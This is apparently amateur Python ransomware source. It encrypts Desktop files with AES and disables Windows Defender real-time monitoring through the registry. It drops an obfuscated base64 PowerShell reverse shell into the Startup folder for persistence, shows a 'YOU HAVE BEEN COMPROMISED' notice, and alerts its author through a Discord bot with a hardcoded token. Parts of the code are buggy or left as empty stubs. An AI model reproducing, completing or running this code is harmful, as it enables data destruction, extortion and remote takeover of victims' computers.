import base64
import pyAesCrypt
import os
import winreg
import pyAesCrypt
import base64
import tkinter as tk
import subprocess
import discord



#variable declaring 
defender_key = r"SOFTWARE\Microsoft\Windows Defender"
value_name = "DisableRealtimeMonitoring"
value = 1
desktop_path = os.path.expanduser("~/Desktop")
password = "your_password_here"
file_extensions = [".txt", ".jpg", ".docx", ".pdf", ".png", ".exe", ]
intents = discord.Intents.default()
client = discord.Client(intents=intents)
TOKEN = "MTA5ODIyODk3NzA3Nzg2NjU0Ng.GdnU1J.9pd_c-IBAK4Ss8QcQKfiWUT53w3UY9bb7ZJGOA" #discord bot token
CHANNEL_ID = 1098232540860530768



def startup():
	vb_script = 'cG93ZXJzaGVsbCAtbm9wIC1XIGhpZGRlbiAtbm9uaSAtZXAgYnlwYXNzIC1jICIkVENQQ2xpZW50ID0gTmV3LU9iamVjdCBOZXQuU29ja2V0cy5UQ1BDbGllbnQoJzEwLjEwLjEwLjEwJywgOTAwMSk7JE5ldHdvcmtTdHJlYW0gPSAkVENQQ2xpZW50LkdldFN0cmVhbSgpOyRTdHJlYW1Xcml0ZXIgPSBOZXctT2JqZWN0IElPLlN0cmVhbVdyaXRlcigkTmV0d29ya1N0cmVhbSk7ZnVuY3Rpb24gV3JpdGVUb1N0cmVhbSAoJFN0cmluZykge1tieXRlW11dJHNjcmlwdDpCdWZmZXIgPSAwLi4kVENQQ2xpZW50LlJlY2VpdmVCdWZmZXJTaXplIHwgJSB7MH07JFN0cmVhbVdyaXRlci5Xcml0ZSgkU3RyaW5nICsgJ1NIRUxMPiAnKTskU3RyZWFtV3JpdGVyLkZsdXNoKCl9V3JpdGVUb1N0cmVhbSAnJzt3aGlsZSgoJEJ5dGVzUmVhZCA9ICROZXR3b3JrU3RyZWFtLlJlYWQoJEJ1ZmZlciwgMCwgJEJ1ZmZlci5MZW5ndGgpKSAtZ3QgMCkgeyRDb21tYW5kID0gKFt0ZXh0LmVuY29kaW5nXTo6VVRGOCkuR2V0U3RyaW5nKCRCdWZmZXIsIDAsICRCeXRlc1JlYWQgLSAxKTskT3V0cHV0ID0gdHJ5IHtJbnZva2UtRXhwcmVzc2lvbiAkQ29tbWFuZCAyPiYxIHwgT3V0LVN0cmluZ30gY2F0Y2ggeyRfIHwgT3V0LVN0cmluZ31Xcml0ZVRvU3RyZWFtICgkT3V0cHV0KX0kU3RyZWFtV3JpdGVyLkNsb3NlKCki'
	vb_script2 = ''
	real_script = base64.b64decode(vb_script)
	startup_dir = os.path.join(os.environ['APPDATA'], r'Microsoft\Windows\Start Menu\Programs\Startup')
	script_path = os.path.join(startup_dir, 'sysinfo.vbs')
	path2 = os.path.join(startup_dir, 'connect.vbs')

	with open(script_path, 'w') as f:
   	 f.write(real_script)
   	with open(path2, 'w') as f:
   		f.write(vb_script2)

def set_defender_realtime_monitoring(value):
    try:
        key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, defender_key, 0, winreg.KEY_SET_VALUE)       
        winreg.SetValueEx(key, value_name, 0, winreg.REG_DWORD, value)        
        winreg.CloseKey(key)        
    except Exception as e:
        print("Error:", e)
def core():
	core_dir = os.path.join(os.environ['APPDATA'], r'Microsoft\Windows\Start Menu\Programs\Startup')
	directory = os,path.join(core_dir, 'system_core')
	file1 = os.path.join(directory, 'main.vbs')
	os.mkdir(directory)
	exc1 = ""
	with open(file1, 'w+')as f:
		f.write(exc1)

def encrypt_files(directory, password, extensions):
    for root, dirs, files in os.walk(directory):
        for file in files:
            if any(file.endswith(ext) for ext in extensions):
                filepath = os.path.join(root, file)
                encrypted_filepath = filepath + ".aes"
                with open(filepath, "rb") as f_in:
                    with open(encrypted_filepath, "wb") as f_out:
                        pyAesCrypt.encryptStream(f_in, f_out, password, pyAesCrypt.AES256, bufferSize=64 * 1024)
                print(f"Encrypted: {filepath}")





def massage():

	window = tk.Tk()
	window.title("NOTICE")
	window.geometry("500x300")

	label = tk.Label(
	    text="YOU HAVE BEEN COMPROMISED!!!",
	    foreground="red",
	    background="black",
	    width=200,
	    height=200,
	    font=('Arial', 20)
	)
	label.pack()

	window.mainloop()

def shellcode():
	decay = """

	"""
	code = base64.b64decode(decay)
	subprocess.run(code)





@client.event
async def on_ready():
        channel = client.get_channel(CHANNEL_ID)
        await channel.send(f"""
            Someone clicked this shity randsomware!!
        """)



encrypt_files(desktop_path, password, file_extensions)
set_defender_realtime_monitoring(value)
startup()
massage()
client.run(TOKEN)



